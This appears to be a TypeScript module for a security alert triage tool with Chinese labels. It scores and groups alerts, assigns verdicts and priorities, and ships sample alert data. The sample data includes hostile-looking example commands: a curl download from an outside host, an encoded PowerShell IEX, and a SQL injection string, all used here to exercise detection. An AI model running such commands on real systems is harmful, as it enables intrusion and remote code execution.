  const victimScore = clamp(victimAlerts.length * 5 + ({ critical: 38, high: 26, medium: 14, low: 5 }[alert.asset_criticality]))
  const vulnScore = clamp((alert.cve ? 42 : 8) + (alert.internet_exposed ? 28 : 0) + (/exploit|rce|webshell|利用/i.test(alert.alert_type) ? 22 : 0))
  const assetScore = clamp(({ critical: 78, high: 60, medium: 38, low: 18 }[alert.asset_criticality]) + (alert.internet_exposed ? 15 : 0))

  const findings = [
    createFinding('threat-intel', '威胁情报查询', intelScore, intelScore >= 70 ? '来源指标与高风险情报特征吻合' : intelScore >= 35 ? '来源指标存在有限风险上下文' : '未发现强情报命中', [`情报分 ${intelScore}`, `来源地区 ${alert.source_country}`]),
    createFinding('source-ip', '攻击 IP 告警分析', sourceScore, uniqueTargets >= 3 ? '同一来源触达多个目标，呈现横向扫描特征' : sourceAlerts.length >= 4 ? '同源告警在当前批次内高频出现' : '同源活动规模有限', [`同源 ${sourceAlerts.length} 条`, `涉及 ${uniqueTargets} 个目标`]),
    createFinding('account', '账号行为分析', accountScore, hasSuccess && totalFailures > 0 ? '失败后出现成功登录，需要优先复核账号使用情况' : totalFailures >= 5 ? '短时连续认证失败，疑似口令猜测' : '账号行为未出现明显异常序列', [`失败累计 ${totalFailures} 次`, `后续成功 ${hasSuccess ? '是' : '否'}`, `账号 ${alert.username || '未提供'}`]),
    createFinding('host-audit', '主机审计日志分析', hostScore, suspiciousCommand ? '进程或命令行包含高风险执行特征' : '主机侧未提供高风险执行证据', [`进程 ${alert.process_name || '未提供'}`, `命令行 ${alert.command_line || '未提供'}`]),
    createFinding('victim-ip', '受害 IP 告警分析', victimScore, victimAlerts.length >= 4 ? '目标资产在当前批次内被多次触发' : '目标侧告警数量有限', [`目标告警 ${victimAlerts.length} 条`, `资产等级 ${alert.asset_criticality}`]),
    createFinding('vulnerability', '漏洞风险评估', vulnScore, alert.cve && alert.internet_exposed ? '公网资产关联明确漏洞编号，存在可利用风险' : alert.cve ? '告警关联漏洞编号，需核对补丁与暴露面' : '未提供可确认的漏洞证据', [`漏洞编号 ${alert.cve || '未提供'}`, `公网暴露 ${alert.internet_exposed ? '是' : '否'}`]),
    createFinding('asset', '资产信息分析', assetScore, ['critical', 'high'].includes(alert.asset_criticality) ? '目标为重要资产，事件影响权重上调' : '目标资产业务权重一般', [`资产 ${alert.asset_name || alert.asset_id || alert.destination_ip}`, `重要度 ${alert.asset_criticality}`]),
  ]

  const severityBase = { critical: 60, high: 45, medium: 28, low: 14 }[alert.severity]
  const weighted = severityBase + intelScore * .18 + sourceScore * .11 + accountScore * .14 + hostScore * .14 + victimScore * .08 + vulnScore * .16 + assetScore * .09
  let riskScore = clamp(weighted / 1.5)
  if (trustedAutomation) riskScore = Math.min(riskScore, 18)
  if (blocked && !hasSuccess && !suspiciousCommand) riskScore = Math.max(8, riskScore - 13)
  if (hasSuccess && totalFailures >= 5) riskScore = Math.max(riskScore, 78)
  if (suspiciousCommand && ['critical', 'high'].includes(alert.asset_criticality)) riskScore = Math.max(riskScore, 82)

  const verdict: AlertVerdict = riskScore >= 72 ? 'confirmed' : riskScore >= 42 ? 'suspicious' : 'noise'
  const priority: AlertPriority = riskScore >= 85 ? 'P1' : riskScore >= 65 ? 'P2' : riskScore >= 38 ? 'P3' : 'P4'
  const completeness = [alert.asset_name, alert.action, alert.source, alert.raw_event].filter(Boolean).length
  const confidence = clamp(62 + completeness * 5 + Math.min(group.length, 4) * 3 - (verdict === 'suspicious' ? 6 : 0), 60, 96)
  const primaryFindings = [...findings].sort((a, b) => b.score - a.score).slice(0, 3)
  const summary = verdict === 'confirmed'
    ? `${primaryFindings[0].name}与${primaryFindings[1].name}形成相互印证，建议按真实安全事件处置。`
    : verdict === 'suspicious'
      ? '存在风险信号但证据尚未闭环，建议补充身份、主机或网络侧记录后复核。'
      : trustedAutomation
        ? '活动来自已识别的内部自动化来源，当前证据支持降噪归并。'
        : blocked && group.length > 1
          ? '同类行为已被阻断且未观察到成功迹象，按重复低风险告警归并。'
          : '当前证据强度较低，保留记录并按低优先级观察。'

  /* —— 设备识别 —— */
  const device = detectDevice(alert)

  /* —— 攻击画像与指挥官调度 —— */
  const profile = resolveAttackProfile(alert)
  const dispatched = dispatchInvestigation(alert, profile, device, findings, group)
  const commander: CommanderDecision = {
    commander_id: COMMANDER.id,
    commander_name: COMMANDER.name,
    decision: `已接收平台规则降噪后的告警，识别来源设备为「${device.name === DEVICE_CATEGORY_LABEL[device.category] ? device.name : `${device.name}（${DEVICE_CATEGORY_LABEL[device.category]}）`}」，画像判定为「${profile.name}」，下发 ${dispatched.length} 个子智能体并行研判。`,
    attack_profile: profile.name,
    dispatched,
  }

  /* —— SOAR 处置建议 —— */
  const soar = matchSoarPlaybooks(verdict, profile, device, alert).map(playbook => ({
    playbook,
    status: 'suggested' as const,
    note: verdict === 'confirmed' ? '研判结论为确认事件，建议按审批流程执行' : verdict === 'suspicious' ? '证据待闭环，建议先执行观察与核验类动作' : '低风险记录，仅建议保留审计能力',
  }))

  const recommendations = soar.length
    ? soar.map(item => `${item.playbook.name}（${item.playbook.playbook_id} · ${item.playbook.script}）`)
    : ['保留原始记录与降噪依据以便审计']

  return {
    case_id: `INC-${new Date(alert.occurred_at).toISOString().slice(0, 10).replace(/-/g, '')}-${String(index + 1).padStart(3, '0')}`,
    representative: alert,
    alerts: group,
    first_seen: group[0].occurred_at,
    last_seen: group.at(-1)!.occurred_at,
    verdict,
    priority,
    risk_score: riskScore,
    confidence,
    summary,
    reason: primaryFindings.map(item => `${item.name} ${item.score}分：${item.finding}`).join('；'),
    recommendations,
    findings,
    plan: ['接收平台规则降噪后的告警输入', `识别来源设备：${device.name} / ${DEVICE_CATEGORY_LABEL[device.category]}`, `画像判定「${profile.name}」，下发 ${dispatched.length} 个子智能体并行研判`, '子智能体返回证据，综合研判生成结论', '匹配 SOAR 剧本库，输出处置建议'],
    device,
    commander,
    soar,
  }
}

export function analyzeAlerts(alerts: SecurityAlert[]): { cases: TriageCase[]; summary: TriageSummary } {
  const cases = groupAlerts(alerts)
    .map((group, index) => analyzeGroup(group, alerts, index))
    .sort((a, b) => b.risk_score - a.risk_score || Date.parse(b.last_seen) - Date.parse(a.last_seen))
  const suppressed = alerts.length - cases.length
  const deviceCount = new Set(cases.map(item => `${item.device.category}:${item.device.name}`)).size
  return {
    cases,
    summary: {
      source_count: alerts.length,
      case_count: cases.length,
      suppressed_count: suppressed,
      reduction_rate: alerts.length ? Math.round(suppressed / alerts.length * 1000) / 10 : 0,
      high_risk_count: cases.filter(item => item.verdict === 'confirmed').length,
      suspicious_count: cases.filter(item => item.verdict === 'suspicious').length,
      noise_count: cases.filter(item => item.verdict === 'noise').length,
      device_count: deviceCount,
    },
  }
}

export function alertsToCsv(alerts: SecurityAlert[]) {
  const quote = (value: unknown) => {
    const text = typeof value === 'boolean' ? String(value) : String(value ?? '')
    return /[\",\n\r]/.test(text) ? `\"${text.replace(/\"/g, '\"\"')}\"` : text
  }
  return [ALERT_TEMPLATE_FIELDS.join(','), ...alerts.map(alert => ALERT_TEMPLATE_FIELDS.map(field => quote(alert[field])).join(','))].join('\n')
}

/** 为示例数据生成贴近真实设备上报格式的 payload */
function samplePayload(source: string, alertType: string): string {
  if (source === 'WAF') return 'HTTP请求URL：/api/v1/upload，HTTP请求头：User-Agent: curl/8.0，HTTP请求体：multipart/form-data，HTTP响应状态码：200，HTTP响应头：Server: nginx，HTTP响应体：ok，Payload：file_ext=php'
  if (source === 'EDR') return '进程名：powershell.exe，命令行：powershell -enc SQBFAFgA，文件路径：C:\\Users\\Public\\a.exe，注册表：HKCU\\Run\\svc，Payload：encodedcommand'
  if (source === 'IAM') return '登录用户：root，登录来源：境外 IP，认证方式：密码，失败次数：8，Payload：ssh.auth=failed,login=root'
  if (source === 'DB-AUDIT') return 'SQL语句：SELECT * FROM sys_user WHERE id=1 OR 1=1，数据库：mysql，源会话：10.10.2.20:55432，Payload：sql.type=select,risk=injection'
  if (source === 'APM') return '健康探测：HTTP 200，延迟：12ms，请求路径：/healthz，Payload：probe.type=http,status=200'
  return `HTTP请求URL：，HTTP请求头：，HTTP请求体：，HTTP响应状态码：，HTTP响应头：，HTTP响应体：，Payload：udp.payload=${alertType || 'anomaly'}`
}

export const SAMPLE_ALERTS: SecurityAlert[] = [
  ['A-20260826-001','2026-08-26T01:14:02Z','203.0.113.44','10.20.3.15',443,'','ASSET-WEB-01','统一门户','critical','Web 漏洞利用','critical','blocked','公网组件异常请求','境外',0,false,'CVE-2025-55182',true,91,'nginx','','WAF','命中高危利用特征'],
  ['A-20260826-002','2026-08-26T01:16:15Z','203.0.113.44','10.20.3.15',443,'','ASSET-WEB-01','统一门户','critical','Web 漏洞利用','critical','blocked','公网组件异常请求','境外',0,false,'CVE-2025-55182',true,91,'nginx','','WAF','同源重复请求'],
  ['A-20260826-003','2026-08-26T01:18:40Z','203.0.113.44','10.20.3.15',443,'','ASSET-WEB-01','统一门户','critical','Web 漏洞利用','critical','allowed','公网组件异常请求','境外',0,false,'CVE-2025-55182',true,91,'java','curl http://198.51.100.8/a','EDR','应用进程产生异常外联'],
  ['A-20260826-004','2026-08-26T02:05:00Z','198.51.100.27','10.20.8.21',22,'root','ASSET-OPS-02','运维跳板机','critical','暴力破解','high','observed','SSH 连续认证失败','境外',8,false,'',true,78,'sshd','','IAM','连续失败登录'],
  ['A-20260826-005','2026-08-26T02:06:20Z','198.51.100.27','10.20.8.21',22,'root','ASSET-OPS-02','运维跳板机','critical','暴力破解','high','observed','SSH 连续认证失败','境外',6,true,'',true,78,'sshd','','IAM','失败后登录成功'],
  ['A-20260826-006','2026-08-26T03:00:00Z','10.10.1.18','10.20.6.11',443,'monitor-agent','ASSET-API-04','业务接口','medium','健康探测','low','allowed','内部监控健康检查','内部',0,true,'',false,0,'node','','APM','正常健康探测'],
  ['A-20260826-007','2026-08-26T03:01:00Z','10.10.1.18','10.20.6.11',443,'monitor-agent','ASSET-API-04','业务接口','medium','健康探测','low','allowed','内部监控健康检查','内部',0,true,'',false,0,'node','','APM','正常健康探测'],
  ['A-20260826-008','2026-08-26T03:02:00Z','10.10.1.18','10.20.6.11',443,'monitor-agent','ASSET-API-04','业务接口','medium','健康探测','low','allowed','内部监控健康检查','内部',0,true,'',false,0,'node','','APM','正常健康探测'],
  ['A-20260826-009','2026-08-26T04:20:00Z','192.0.2.91','10.20.4.32',3389,'guest','ASSET-OFFICE-12','办公终端-12','low','远程登录失败','medium','blocked','RDP 认证失败','境外',3,false,'',false,35,'svchost.exe','','EDR','连接已阻断'],
  ['A-20260826-010','2026-08-26T04:22:00Z','192.0.2.91','10.20.4.32',3389,'guest','ASSET-OFFICE-12','办公终端-12','low','远程登录失败','medium','blocked','RDP 认证失败','境外',2,false,'',false,35,'svchost.exe','','EDR','连接已阻断'],
  ['A-20260826-011','2026-08-26T05:45:00Z','10.20.4.77','10.20.9.10',445,'svc-backup','ASSET-FILE-01','核心文件服务','high','异常进程执行','high','observed','终端可疑命令行','内部',0,true,'',false,12,'powershell.exe','powershell -enc [redacted]','EDR','检测到编码命令'],
  ['A-20260826-012','2026-08-26T06:10:00Z','198.51.100.66','10.20.3.15',443,'','ASSET-WEB-01','统一门户','critical','目录扫描','medium','blocked','Web 路径枚举','境外',0,false,'',true,46,'nginx','','WAF','多路径请求已阻断'],
  ['A-20260826-013','2026-08-26T06:11:00Z','198.51.100.66','10.20.3.16',443,'','ASSET-WEB-02','客户服务门户','high','目录扫描','medium','blocked','Web 路径枚举','境外',0,false,'',true,46,'nginx','','WAF','多目标路径请求'],
  ['A-20260826-014','2026-08-26T06:12:00Z','198.51.100.66','10.20.3.17',443,'','ASSET-WEB-03','查询服务','medium','目录扫描','medium','blocked','Web 路径枚举','境外',0,false,'',true,46,'nginx','','WAF','多目标路径请求'],
  ['A-20260826-015','2026-08-26T07:30:00Z','10.10.2.20','10.20.7.5',3306,'backup-service','ASSET-DB-03','报表数据库','medium','数据库连接','low','allowed','备份服务定时连接','内部',0,true,'',false,0,'mysqld','','DB-AUDIT','已登记备份任务'],
  ['A-20260826-016','2026-08-26T07:31:00Z','10.10.2.20','10.20.7.5',3306,'backup-service','ASSET-DB-03','报表数据库','medium','数据库连接','low','allowed','备份服务定时连接','内部',0,true,'',false,0,'mysqld','','DB-AUDIT','已登记备份任务'],
].map((row) => ({
  alert_id: String(row[0]), occurred_at: String(row[1]), source_ip: String(row[2]), destination_ip: String(row[3]), destination_port: Number(row[4]),
  username: String(row[5]), asset_id: String(row[6]), asset_name: String(row[7]), asset_criticality: row[8] as AlertCriticality,
  alert_type: String(row[9]), severity: row[10] as AlertSeverity, action: String(row[11]), rule_name: String(row[12]), source_country: String(row[13]),
  failed_login_count: Number(row[14]), login_succeeded: Boolean(row[15]), cve: String(row[16]), internet_exposed: Boolean(row[17]), threat_intel_score: Number(row[18]),
  process_name: String(row[19]), command_line: String(row[20]), source: String(row[21]), raw_event: String(row[22]),
  device_id: String(row[21] === 'WAF' ? '4' : row[21] === 'EDR' ? '5' : row[21] === 'IAM' ? '6' : row[21] === 'DB-AUDIT' ? '7' : '9'),
  payload: samplePayload(String(row[21]), String(row[9])),
}))
